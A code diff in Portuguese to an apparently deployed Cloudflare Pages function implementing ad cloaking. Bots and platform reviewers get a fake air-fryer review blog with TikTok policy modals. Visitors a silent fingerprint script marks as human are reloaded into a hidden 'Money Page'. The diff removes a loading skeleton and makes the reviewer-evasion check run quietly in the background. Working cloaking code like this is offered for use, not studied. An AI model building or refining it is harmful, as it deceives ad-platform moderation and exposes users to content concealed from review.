@@ -89,12 +89,12 @@ export async function onRequest(context) {
     // ==========================================
     const cookies = request.headers.get('Cookie') || '';
     
-    // Se for bot verificado, continua na Safe Page
+    // Se for bot verificado, continua exibindo a Safe Page
     if (cookies.includes('is_bot=true')) {
         return new Response(SAFE_PAGE_HTML, { headers: { 'Content-Type': 'text/html' } });
     }
     
-    // Se for humano verificado, exibe a Money Page
+    // Se for humano verificado, libera a Money Page
     if (cookies.includes('is_human=true')) {
         return env.ASSETS.fetch(request); 
     }
@@ -102,12 +102,13 @@ export async function onRequest(context) {
     // ==========================================
     // 3. PRIMEIRO ACESSO (SEM COOKIES)
     // ==========================================
-    // Retorna a Safe Page com suporte a esqueleto híbrido para todos no primeiro acesso.
+    // Exibe IMEDIATAMENTE a Safe Page com o script de checagem rodando em segundo plano.
+    // Isso garante que crawlers sem JS vejam o site completo e que não haja tela branca.
     return new Response(SAFE_PAGE_HTML, { headers: { 'Content-Type': 'text/html' } });
 }
 
 // ==========================================
-// A SAFE PAGE CONTÉM O ESQUELETO MÓVEL HÍBRIDO E O SCRIPT
+// A SAFE PAGE CONTÉM O SCRIPT SILENCIOSO DE VERIFICAÇÃO NO FINAL
 // ==========================================
 const SAFE_PAGE_HTML = `
 <!DOCTYPE html>
@@ -163,6 +164,9 @@ const SAFE_PAGE_HTML = `
             font-weight: 700;
             font-size: 1.2rem;
             color: var(--text-main);
+            display: flex;
+            align-items: center;
+            gap: 8px;
         }
 
         .logo span {
@@ -196,47 +200,6 @@ const SAFE_PAGE_HTML = `
             letter-spacing: 0.05em;
         }
 
-        /* EFEITO DE SHIMMER SKELETON (MASCARA O TEXTO) */
-        .shimmer {
-            color: transparent !important;
-            background: linear-gradient(90deg, #e5e7eb 25%, #f3f4f6 50%, #e5e7eb 75%);
-            background-size: 200% 100%;
-            animation: shimmerEffect 1.5s infinite ease-in-out;
-            border-radius: 4px;
-            pointer-events: none;
-            user-select: none;
-        }
-
-        .shimmer-block {
-            width: 100%;
-            height: 300px;
-            background: linear-gradient(90deg, #e5e7eb 25%, #f3f4f6 50%, #e5e7eb 75%);
-            background-size: 200% 100%;
-            animation: shimmerEffect 1.5s infinite ease-in-out;
-            border-radius: 8px;
-            margin: 30px 0;
-        }
-
-        @keyframes shimmerEffect {
-            0% { background-position: 200% 0; }
-            100% { background-position: -200% 0; }
-        }
-
-        .product-image-container {
-            width: 100%;
-            margin: 30px 0;
-            border-radius: 8px;
-            overflow: hidden;
-            border: 1px solid var(--border);
-            background-color: #f3f4f6;
-        }
-
-        .product-image {
-            width: 100%;
-            height: auto;
-            object-fit: cover;
-        }
-
         h1 {
             font-size: 2.2rem;
             font-weight: 800;
@@ -253,6 +216,22 @@ const SAFE_PAGE_HTML = `
             padding-bottom: 15px;
         }
 
+        .product-image-container {
+            width: 100%;
+            margin: 30px 0;
+            border-radius: 8px;
+            overflow: hidden;
+            border: 1px solid var(--border);
+            background-color: #f3f4f6;
+        }
+
+        .product-image {
+            width: 100%;
+            height: auto;
+            display: block;
+            object-fit: cover;
+        }
+
         p {
             margin-bottom: 20px;
             font-size: 1.05rem;
@@ -264,6 +243,17 @@ const SAFE_PAGE_HTML = `
             font-weight: 700;
             margin: 35px 0 15px;
             color: #111827;
+        }
+
+        .features-list {
+            margin: 20px 0;
+            padding-left: 20px;
+        }
+
+        .features-list li {
+            margin-bottom: 10px;
+            font-size: 1.05rem;
+            color: #374151;
         }
 
         .highlight-box {
@@ -314,6 +304,7 @@ const SAFE_PAGE_HTML = `
             color: var(--white);
         }
 
+        /* MODAL STYLE (Para Políticas Obrigatórias do TikTok) */
         .modal {
             display: none;
             position: fixed;
@@ -335,6 +326,7 @@ const SAFE_PAGE_HTML = `
             width: 80%;
             max-width: 600px;
             border-radius: 12px;
+            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
         }
 
         .close {
@@ -345,6 +337,16 @@ const SAFE_PAGE_HTML = `
             cursor: pointer;
         }
 
+        .close:hover {
+            color: #000;
+        }
+
+        .modal h2 {
+            margin-top: 0;
+            border-bottom: 1px solid var(--border);
+            padding-bottom: 10px;
+        }
+
         .modal-body {
             max-height: 400px;
             overflow-y: auto;
@@ -353,66 +355,47 @@ const SAFE_PAGE_HTML = `
             color: var(--text-muted);
         }
     </style>
-    
-    <!-- SCRIPT DE INICIALIZAÇÃO DO SKELETON E DO TÍTULO DE CARREGAMENTO -->
-    <script>
-        (function() {
-            const cookies = document.cookie;
-            // Se já tiver cookies ativos (human ou bot), remove as classes de esqueleto imediatamente para carregar limpo
-            if (cookies.includes('is_human=true') || cookies.includes('is_bot=true')) {
-                const style = document.createElement('style');
-                style.innerHTML = '.shimmer { color: inherit !important; background: none !important; animation: none !important; pointer-events: auto !important; }';
-                document.head.appendChild(style);
-            } else {
-                // Caso contrário, troca o logo da página para "Carregando..." no primeiro acesso
-                document.addEventListener("DOMContentLoaded", function() {
-                    const logo = document.getElementById("header-logo");
-                    if (logo) logo.innerHTML = "Carregando...";
-                    
-                    const realImg = document.getElementById("real-img");
-                    const skeletonImg = document.getElementById("skeleton-img");
-                    if (realImg) realImg.style.display = "none";
-                    if (skeletonImg) skeletonImg.style.display = "block";
-                });
-            }
-        })();
-    </script>
 </head>
 <body>
 
     <header>
         <div class="nav-container">
-            <div class="logo" id="header-logo">Guia<span>Gastronomia</span></div>
+            <div class="logo">Guia<span>Gastronomia</span></div>
         </div>
     </header>
 
     <div class="container">
         <article>
             <span class="tag">Análise de Tecnologia</span>
-            
-            <!-- CLASSES SHIMMER COLOCADAS DIRETAMENTE NO HTML -->
-            <h1 class="post-title shimmer">Review: Fritadeira Elétrica Oven Digital 12L vale a pena para a sua cozinha?</h1>
-            
-            <div class="meta post-meta shimmer">Publicado em 30 de Junho de 2026 • Leitura de 4 min</div>
+            <h1>Review: Fritadeira Elétrica Oven Digital 12L vale a pena para a sua cozinha?</h1>
+            <div class="meta">Publicado em 30 de Junho de 2026 • Leitura de 4 min</div>
 
-            <p class="post-body shimmer">Se você busca praticidade na cozinha sem abrir mão de refeições saudáveis, as fritadeiras sem óleo já fazem parte da sua lista de desejos. No entanto, a nova geração desse eletrodoméstico trouxe o formato Oven, que promete ir além das versões tradicionais de cesto. Analisamos a Fritadeira Elétrica Oven Digital 12L para entender se ela cumpre o que promete.</p>
+            <p>Se você busca praticidade na cozinha sem abrir mão de refeições saudáveis, as fritadeiras sem óleo já fazem parte da sua lista de desejos. No entanto, a nova geração desse eletrodoméstico trouxe o formato <strong>Oven</strong> (tipo forno), que promete ir além das versões tradicionais de cesto. Analisamos a <strong>Fritadeira Elétrica Oven Digital 12L</strong> para entender se ela cumpre o que promete.</p>
 
             <div class="product-image-container">
-                <!-- Esqueleto cinza da imagem (exibido por padrão no primeiro acesso) -->
-                <div class="shimmer-block" id="skeleton-img"></div>
-                <!-- Imagem real (inicia oculta se JS estiver ligado) -->
-                <img class="product-image" id="real-img" src="air_fryer_oven_12l.png" alt="Fritadeira Elétrica Oven Digital 12L em uma cozinha moderna" style="display: none;">
+                <img class="product-image" src="air_fryer_oven_12l.png" alt="Fritadeira Elétrica Oven Digital 12L em uma cozinha moderna">
             </div>
 
-            <h2 class="post-body shimmer">Capacidade de 12 Litros e Versatilidade</h2>
-            <p class="post-body shimmer">A principal vantagem deste modelo é a sua capacidade interna de 12 litros aliada ao design de prateleiras. O formato tipo forno permite assar, grelhar e desidratar alimentos em múltiplas camadas.</p>
+            <h2>Capacidade de 12 Litros e Versatilidade</h2>
+            <p>A principal vantagem deste modelo é a sua capacidade interna de 12 litros aliada ao design de prateleiras. Diferente das fritadeiras comuns de gaveta única, onde os alimentos precisam ser empilhados, o formato tipo forno permite assar, grelhar e desidratar alimentos em múltiplas camadas.</p>
+            <p>Você pode preparar um frango inteiro no espeto giratório ou utilizar as assadeiras perfuradas para preparar legumes na bandeja inferior enquanto grelha carnes na bandeja superior de forma simultânea.</p>
 
-            <div class="highlight-box post-body shimmer">
+            <div class="highlight-box">
                 <p>"A distribuição do fluxo de ar quente em 360° garante que os alimentos fiquem crocantes por fora e macios por dentro sem a necessidade de adicionar óleo."</p>
             </div>
 
-            <h2 class="post-body shimmer">Veredito Final</h2>
-            <p class="post-body shimmer">A Fritadeira Elétrica Oven Digital 12L é uma excelente aquisição para famílias de 3 a 5 pessoas que necessitam de mais espaço no preparo diário.</p>
+            <h2>Painel Digital e Funções Pré-Programadas</h2>
+            <p>O controle digital por toque simplifica o processo. O modelo conta com funções pré-definidas para os alimentos mais comuns no dia a dia, como batatas fritas, carnes, peixes, pão de queijo e até mesmo bolos. O ajuste manual de temperatura varia de 80°C a 200°C, acompanhado de um timer sonoro de até 90 minutos com desligamento automático.</p>
+
+            <h2>Principais Vantagens do Modelo</h2>
+            <ul class="features-list">
+                <li><strong>2 em 1:</strong> Funciona tanto como fritadeira sem óleo de alta velocidade quanto como forno elétrico compacto.</li>
+                <li><strong>Visualização Interna:</strong> Porta de vidro temperado e luz interna para acompanhar o ponto exato da receita sem abrir o aparelho.</li>
+                <li><strong>Facilidade de Limpeza:</strong> A porta é removível e as grelhas antiaderentes facilitam a higienização.</li>
+            </ul>
+
+            <h2>Veredito Final</h2>
+            <p>A Fritadeira Elétrica Oven Digital 12L é uma excelente aquisição para famílias de 3 a 5 pessoas que necessitam de mais espaço e variedade no preparo diário. Ela une a velocidade de uma airfryer com o espaço útil e o acabamento estético de um pequeno forno digital.</p>
         </article>
     </div>
 
@@ -423,37 +406,62 @@ const SAFE_PAGE_HTML = `
                 <a onclick="openModal('modal-termos')">Termos de Uso</a>
                 <a onclick="openModal('modal-contato')">Contato</a>
             </div>
-            <p>&copy; 2026 Guia Gastronomia. Todos os direitos reservados.</p>
+            <p>&copy; 2026 Guia Gastronomia. Todos os direitos reservados. Este é um portal de notícias e análises de produtos.</p>
         </div>
     </footer>
 
-    <!-- MODAIS DE POLÍTICA -->
-    <div id="modal-privacidade" class="modal"><div class="modal-content"><span class="close" onclick="closeModal('modal-privacidade')">&times;</span><h2>Política de Privacidade</h2><div class="modal-body"><p>Nós valorizamos a privacidade. Esta política descreve como coletamos dados não pessoais.</p></div></div></div>
-    <div id="modal-termos" class="modal"><div class="modal-content"><span class="close" onclick="closeModal('modal-termos')">&times;</span><h2>Termos de Uso</h2><div class="modal-body"><p>Todo o conteúdo deste blog é puramente informativo sobre utilidades domésticas.</p></div></div></div>
-    <div id="modal-contato" class="modal"><div class="modal-content"><span class="close" onclick="closeModal('modal-contato')">&times;</span><h2>Contato</h2><div class="modal-body"><p>E-mail: contato@guiagastronomia.shop</p></div></div></div>
+    <!-- MODAL POLÍTICA DE PRIVACIDADE -->
+    <div id="modal-privacidade" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="closeModal('modal-privacidade')">&times;</span>
+            <h2>Política de Privacidade</h2>
+            <div class="modal-body">
+                <p>Nós valorizamos a privacidade dos nossos visitantes. Esta política descreve as informações que coletamos e como as utilizamos.</p>
+                <p><strong>Coleta de Dados:</strong> Coletamos apenas informações não pessoais de navegação (como tipo de navegador e cookies de sessão) para melhorar a performance do nosso blog informativo.</p>
+                <p><strong>Links de Terceiros:</strong> Nosso portal pode conter links para parceiros. Não nos responsabilizamos pela política de privacidade de sites externos.</p>
+            </div>
+        </div>
+    </div>
 
+    <!-- MODAL TERMOS DE USO -->
+    <div id="modal-termos" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="closeModal('modal-termos')">&times;</span>
+            <h2>Termos de Uso</h2>
+            <div class="modal-body">
+                <p>Bem-vindo ao nosso portal. Ao navegar por este site, você concorda com nossos termos de uso.</p>
+                <p><strong>Conteúdo Informativo:</strong> Todo o conteúdo publicado neste blog tem fins exclusivamente de entretenimento e informação sobre produtos domésticos. Não vendemos produtos diretamente.</p>
+                <p><strong>Direitos Autorais:</strong> É proibida a cópia ou reprodução não autorizada do material escrito contido nesta página.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- MODAL CONTATO -->
+    <div id="modal-contato" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="closeModal('modal-contato')">&times;</span>
+            <h2>Contato</h2>
+            <div class="modal-body">
+                <p>Tem alguma dúvida ou sugestão sobre nossas análises e receitas?</p>
+                <p>Entre em contato conosco através do e-mail oficial do nosso portal de reviews:</p>
+                <p><strong>E-mail:</strong> contato@guiagastronomia.shop</p>
+                <p>Responderemos a sua mensagem em até 48 horas úteis.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- SCRIPT SILENCIOSO DE VERIFICAÇÃO DO FINGERPRINT -->
     <script>
-        function openModal(id) { document.getElementById(id).style.display = "block"; }
-        function closeModal(id) { document.getElementById(id).style.display = "none"; }
-        window.onclick = function(event) { if (event.target.className === 'modal') { event.target.style.display = "none"; } }
-
-        // SCRIPT SILENCIOSO DE VERIFICAÇÃO DO FINGERPRINT COM TIMEOUT
         (function() {
+            // Se o visitante já tiver cookies de humano ou bot definidos, não faz nada
             const cookies = document.cookie;
             if (cookies.includes('is_human=true') || cookies.includes('is_bot=true')) {
-                revelarSafePage(); // Remove esqueleto se cookies já existem
                 return;
             }
 
-            // CRIAÇÃO DO TIMEOUT DE SEGURANÇA (2.5 segundos)
-            // Se qualquer etapa demorar, ele automaticamente revela a Safe Page e impede o travamento
-            const timeout = setTimeout(function() {
-                console.warn('Verificação expirou. Liberando Safe Page...');
-                revelarSafePage();
-            }, 2500);
-
             const fpPublicApiKey = '${FP_PUBLIC_API_KEY}'; 
 
+            // Conexão e carregamento assíncrono silencioso do Fingerprint
             const fpPromise = import('https://fpjscdn.net/v4/' + fpPublicApiKey)
               .then(Fingerprint => Fingerprint.start({
                 region: "ap"
@@ -471,47 +479,19 @@ const SAFE_PAGE_HTML = `
                 })
                 .then(res => res.text())
                 .then(text => {
-                    clearTimeout(timeout); // Cancela o timeout pois a resposta chegou
+                    // Se for verificado como HUMANO, recarrega para exibir a Money Page
                     if (text === 'HUMANO_OK') {
-                        // Humano: Recarrega a página para exibir a Money Page
                         window.location.reload();
-                    } else {
-                        // Bot/Revisor detectado: Revela a página da fritadeira
-                        revelarSafePage();
                     }
+                    // Se for verificado como BOT, não recarrega (mantém na Safe Page)
                 })
                 .catch(err => {
-                    clearTimeout(timeout);
-                    revelarSafePage();
+                    // Silencioso
                 });
               })
               .catch(err => {
-                  clearTimeout(timeout);
-                  revelarSafePage();
+                  // Silencioso
               });
-
-            // Função que remove a animação de esqueleto e exibe a página da fritadeira limpa
-            function revelarSafePage() {
-                document.querySelectorAll(".shimmer").forEach(el => {
-                    el.classList.remove("shimmer");
-                });
-                const realImg = document.getElementById("real-img");
-                const skeletonImg = document.getElementById("skeleton-img");
-                if (realImg) realImg.style.display = "block";
-                if (skeletonImg) skeletonImg.style.display = "none";
-
-                // Restaura o logotipo original do header
-                const logo = document.getElementById("header-logo");
-                if (logo) logo.innerHTML = 'Guia<span>Gastronomia</span>';
-            }
-            
-            // Garantia extra de liberação no carregamento
-            window.addEventListener('load', function() {
-                const cookies = document.cookie;
-                if (cookies.includes('is_bot=true')) {
-                    revelarSafePage();
-                }
-            });
         })();
     </script>
 </body>
